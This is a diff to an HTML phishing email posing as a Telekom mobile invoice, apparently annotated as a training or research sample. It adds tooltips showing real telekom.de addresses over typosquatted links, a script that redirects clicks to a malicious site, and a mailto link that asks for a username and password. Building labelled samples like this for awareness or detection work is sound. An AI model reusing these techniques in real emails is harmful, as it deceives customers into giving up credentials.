@@ -3,6 +3,186 @@
    <head>
       <title>Ihre Telekom Mobilfunk RechnungOnline Juni 2024</title>
       <link rel="important stylesheet" href="chrome://messagebody/skin/messageBody.css">
+      <style>
+
+        .content {
+          text-align: center;
+        }
+      
+      
+        .tooltip-container {
+          position: relative;
+          display: inline-block;
+          cursor: pointer;
+        }   
+      
+        .tooltip-container .tooltip {
+          visibility: hidden;
+          width: max-content;
+          font-size: 10px;
+          background-color: black;
+          color: rgb(255, 255, 255);
+          text-align: center;
+          border-radius: 5px;
+          padding: 6px;
+          position: absolute;
+          z-index: 1;
+          bottom: calc(100%);  /* Position the tooltip above the container */
+          left: 50%;
+          transform: translateX(-50%);
+           /* Use negative half of the width to center */ 
+          opacity: 0;
+          transition: opacity 0.3s;
+          
+        } 
+      
+        .tooltip-container:hover .tooltip {
+          visibility: visible;
+          opacity: 1;
+          
+        }
+      
+        .tooltip-container .tooltip a {
+          color: rgb(255, 255, 255);
+          text-decoration: none;
+        }
+      
+        /* Fade In tooltip with CSS */
+        .tooltip-container .tooltipanime {
+          
+          visibility: hidden;
+          width: max-content;
+          background-color: rgb(167, 159, 172);
+          color: #ffffff;
+          text-align: center;
+          border-radius: 6px;
+          padding: 5px;
+          position: absolute;
+          z-index: 1;
+          bottom: 100%;
+          left: 150%;
+          margin-left: -210px;
+          font-size: 10px;
+          
+          /* Fade in tooltip - takes 1 second to go from 0% to 100% opac: */
+          opacity: 0;
+          transition: opacity 1s;
+        }
+      
+        .tooltip-container:hover .tooltipanime {
+          
+        visibility: visible;
+        opacity: 1;
+        }
+      
+      
+      
+        /*create the trainagle under tooltips */
+        .tooltip-container .tooltip::after {
+                  content: '';
+                  position: absolute;
+                  top: 100%;
+                  left: 50%;
+                  margin-left: -5px;
+                  border-width: 5px;
+                  border-style: solid;
+                  border-color: #000000 transparent transparent transparent;
+              }
+      
+      
+
+              /* tooltip with CSS hover effect*/
+            .tooltip-link {
+                position: relative;
+                text-decoration: none;
+                color: #000000; /* Adjust link color */
+            }
+            .tooltip-link:hover:after {
+                content: "Redirect to: https://www.telekom.de/hilfe";
+                position: absolute;
+                width: max-content;
+                font-size: 10px;
+                background-color: #af6767;
+                color: #fff;
+                border-radius: 6px;
+                padding: 6px;
+                z-index: 1;
+                bottom: 450%;
+                left: 50%;
+                transform: translateX(-50%);
+                opacity: 0;
+                visibility: hidden;
+                transition: opacity 0.3s;
+            }
+            
+            .tooltip-link:hover:after {
+                opacity: 1;
+                visibility: visible;
+            }
+            
+
+             /* CSS setting of popup tooltip */
+                .popup-container {
+                    color: #00A4D6;
+                    position: relative;
+                    display: inline-block;
+                    cursor: pointer;
+                    text-decoration: underline;
+                    }
+                    
+                    /* The actual popup (appears on top) */
+                    .popup-container .popuptooltip {
+                    visibility: hidden;
+                    font-size: 10px;
+                    width: 250px;
+                    background-color: #555;
+                    color: #fff;
+                    text-align: center;
+                    border-radius: 6px;
+                    padding: 8px 0;
+                    position: absolute;
+                    z-index: 1;
+                    bottom: 125%;
+                    left: 5%;
+                    margin-left: -80px;
+                    transition: opacity 0.3s;
+                    }
+                    
+                    /* Popup arrow */
+                    .popup-container .popuptooltip::after {
+                    content: "";
+                    position: absolute;
+                    top: 100%;
+                    left: 50%;
+                    margin-left: -5px;
+                    border-width: 5px;
+                    border-style: solid;
+                    border-color: #555 transparent transparent transparent;
+                    }
+                    
+                    /* Toggle this class when clicking on the popup container (hide and show the popup) */
+                    .popup-container .show {
+                    visibility: visible;
+                    opacity: 1;
+                    -webkit-animation: fadeIn 0.5s;
+                    animation: fadeIn 0.5s
+                    }
+                    
+                    /* Add animation (fade in the popup) */
+                    @-webkit-keyframes fadeIn {
+                    from {opacity: 0;}
+                    to {opacity: 1;}
+                    }
+                    
+                    @keyframes fadeIn {
+                    from {opacity: 0;}
+                    to {opacity:1 ;}
+                    }
+    
+      </style>
+
+
+
    </head>
    <body>
 
@@ -102,7 +282,7 @@
                         </tr>
                         <tr>
                            <td>
-                              <div style="margin: 25px 30px 25px 25px; color: #444748; background-color: #ffffff; line-height: 1.4; font-family: Arial; font-size: 17px;">Ihr Rechnungsarchiv inklusive Gutschriften und Einzelverbindungen finden Sie im: <a href="https://www.phishing.de/kundencenter" target="_blank" style="color: #00A4D6; text-decoration: underline;">https://www.telekom.de/kundencenter</a>. (Link Mismatch)</div>
+                              <div style="margin: 25px 30px 25px 25px; color: #444748; background-color: #ffffff; line-height: 1.4; font-family: Arial; font-size: 17px;">Ihr Rechnungsarchiv inklusive Gutschriften und Einzelverbindungen finden Sie im: <a href="https://www.telekomm.de/kundencenter" target="_blank" style="color: #00A4D6; text-decoration: underline;">https://www.telekom.de/kundencenter</a>. (Link Mismatch)</div>
                            </td>
                         </tr>
                         <tr>
@@ -130,14 +310,43 @@
                                  <table width="440">
                                     <tbody>
                                        <tr>
-                                          <td style="width: 33%; text-align: center;"><a href="https://www.telekom.de/kundencenter/startseite?wt_mc=er_sososoxx_reomf-kundencenter&amp;wt_cc4=m1" target="_blank"><img src="https://www.rechnung-online.telekom.de/mf/static/kundencenter_xhdpi.png" alt="Kundencenter" width="96" height="96"></a></td>
-                                          <td style="width: 33%; text-align: center;"><a href="https://telekomhilft.telekom.de?wt_mc=er_sososoxx_in2s-reomf-telekom-hilft&amp;wt_cc4=m1" target="_blank"><img src="https://www.rechnung-online.telekom.de/mf/static/telekom-hilft-sm_graphical_256.png" alt="Community" width="96" height="96"></a></td>
-                                          <td style="width: 33%; text-align: center;"><a href="https://www.telekom.de/hilfe/rechnung?wt_mc=er_sososoxx_in2s-reomf-hilfe-rechnung&amp;wt_cc4=m1" target="_blank"><img src="https://www.rechnung-online.telekom.de/mf/static/bill_graphical_256.png" alt="Hilfe zur Rechnung" width="96" height="96"></a></td>
+                                        <!-- normal tooltip with HTML and CSS style -->
+                                          <td style="width: 33%; text-align: center;">
+                                            <div class="tooltip-container">
+                                                <a href="https://www.telekomm.de/kundenvertrag" target="_blank">
+                                                    <img src="https://www.rechnung-online.telekom.de/mf/static/kundencenter_xhdpi.png" alt="Kundencenter" width="96" height="96">
+                                                </a>
+                                                <div class="tooltip">
+                                                    <a href="https://www.telekomm.de/kundenvertrag" target="_blank">Redirect to: https://www.telekom.de/kundenvertrag </a>
+                                                 </div>
+                                        </div>
+                                        </td>
+
+                                        <!-- fade in tooltip with HTML and CSS style -->
+                                          <td style="width: 33%; text-align: center;">
+                                            <div class="tooltip-container">
+                                            <a href="https://www.telekomm.de/login" target="_blank" >
+                                                <img src="https://www.rechnung-online.telekom.de/mf/static/telekom-hilft-sm_graphical_256.png" alt="Community" width="96" height="96">
+                                            </a>
+                                            <div class="tooltipanime">
+                                                <a href="https://www.telekomm.de/login" target="_blank">Redirect to: https://www.telekom.de/community </a>
+                                             </div>
+                                        </div>
+                                        </td>
+
+                                        <!-- tooltip with CSS hover effect -->
+                                          <td style="width: 33%; text-align: center;">
+                                            <div class="content">
+                                                <a href="https://www.telekome.de/hilfe" target="_blank"  class="tooltip-link">
+                                                    <img src="https://www.rechnung-online.telekom.de/mf/static/bill_graphical_256.png" alt="Hilfe zur Rechnung" width="96" height="96">
+                                                </a>
+                                            </div>
+                                        </td>
                                        </tr>
                                        <tr>
-                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Ihre Verträge online<br>im Kundencenter</span></td>
-                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Telekom hilft<br>Community</span></td>
-                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Hilfe zur<br>Rechnung</span></td>
+                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Ihre Verträge online<br>im Kundencenter (fake normal tooltip with HTML and CSS)</span></td>
+                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Telekom hilft<br>Community (fake fade in tooltip with HTML and CSS)</span></td>
+                                          <td style="width: 33%; text-align: center;"><span style="font-family: Arial; color: #E20074; font-size: 14px; font-weight: bold;">Hilfe zur<br>Rechnung (fake normal tooltip with CSS hover effect)</span></td>
                                        </tr>
                                     </tbody>
                                  </table>
@@ -169,14 +378,28 @@
                            </td>
                         </tr>
                         <tr>
+
+                            <!-- popup tooltip with javascipt -->
                            <td>
-                              <div style="margin: 25px 30px 25px 25px; background-color: #ffffff; line-height: 1.4; font-family: Arial; color: #737577; font-size: 12px;">Diese E-Mail wurde für die Adresse Kaiserstr. 12; Kundenkonto: 0012345678 erstellt. Weitere Informationen zu den Sicherheitsmerkmalen von RechnungOnline finden Sie unter <a href="https://www.telekom.de/hilfe/rechnung/rechnung-erhalten/echtheit-rechnung-per-e-mail?wt_mc=er_sososoxx_in2s-reomf-echtheit-rechnung&amp;wt_cc4=m1" target="_blank" style="color: #00A4D6; text-decoration: underline;">Sicherheitshinweise</a>.<br><br>Eine direkte Antwort auf diese E-Mail ist nicht möglich. Wenn Sie uns per E-Mail erreichen wollen, nutzen Sie bitte unseren 
+                              <div style="margin: 25px 30px 25px 25px; background-color: #ffffff; line-height: 1.4; font-family: Arial; color: #737577; font-size: 12px;">
+                                Diese E-Mail wurde für die Adresse Kaiserstr. 12; Kundenkonto: 0012345678 erstellt. Weitere Informationen zu den Sicherheitsmerkmalen von RechnungOnline finden Sie unter 
+                                <div class="popup-container" onclick="PopUpFunction()">Sicherheitshinweise
+                                    <span class="popuptooltip" id="Poptooltip">Redirect to: https://www.telekom.de/sicherheit</span>
+                                </div>
+                              
+                              
+                            <br><br>
+
+                                Eine direkte Antwort auf diese E-Mail ist nicht möglich. Wenn Sie uns per E-Mail erreichen wollen, nutzen Sie bitte unseren 
                                 <a href="mailto:xueting.huang404@gmail.com?subject=contact%20formular&amp;body=please%20write%20your%20username%20here:%0A%0Aplease%20write%20your%20password%20here:%0A%0Aplease%20write%20down%20your%20questions%20or%20concerning:%0A%0A" style="color: #00A4D6; text-decoration: underline;">Kontakt per E-Mail</a>.(Mailto-Scheme)</div>
                            </td>
                         </tr>
                         <tr>
                            <td bgcolor="#262626">
-                              <div style="height: 15px;">&nbsp;</div>
+                              <div style="height: 15px;">&nbsp;
+
+                              </div>
+
                               <table width="100%">
                                  <tbody>
                                     <tr>
@@ -197,5 +420,24 @@
             </div>
          </body>
       </html>
+
+      <script>
+        // When the user clicks on <div>, open the popup
+    
+        function PopUpFunction() {
+        var popup = document.getElementById("Poptooltip");
+        popup.classList.toggle("show");
+        } 
+    
+        
+        /* let tooltip be clickable and lead to phishing website */
+        document.getElementById("Poptooltip").addEventListener("click", function() {
+            window.location.href = "https://malicious-website.com/verify";
+        });
+    
+    </script> 
    </body>
 </html>
+
+
+
